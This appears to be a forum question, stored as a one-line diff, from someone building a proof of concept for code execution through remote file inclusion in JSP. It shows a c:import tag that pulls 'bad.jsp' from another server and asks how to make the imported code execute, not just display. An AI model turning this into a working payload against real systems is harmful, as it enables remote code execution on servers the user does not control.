@@ -1,0 +1,1 @@
+<p>I'm working on providing a poc for code execution on JSP usign an RFI.</p>  <p>I'm able to import jsp code from another server but the code is displayed and not executed.</p>  <pre><code>&lt;c:import url ="http://localhost:8082/bad.jsp"/&gt; </code></pre>  <p>Any ways to make this code executable ?</p>  <p>Thanks.</p>
